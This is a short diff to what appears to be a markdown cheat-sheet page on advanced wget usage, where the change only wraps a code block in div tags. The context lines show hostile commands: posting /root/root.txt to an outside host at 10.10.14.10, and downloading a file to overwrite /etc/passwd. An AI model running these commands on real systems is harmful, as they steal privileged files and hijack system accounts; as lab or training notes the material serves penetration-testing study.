@@ -7,6 +7,8 @@ tags: ["wget", "file transfer", "http", "web"]
 ---
 ### Advance wget
 
+<div>
+
 ```bash
 # Provide a file with urls
 wget --input-file /root/root.txt
@@ -21,5 +23,7 @@ wget --post-file /root/root.txt http://10.10.14.10
 # Overwrite a file
 wget http://10.10.14.10/passwd.txt -O /etc/passwd
 ```
+
+</div>
 
 <br>
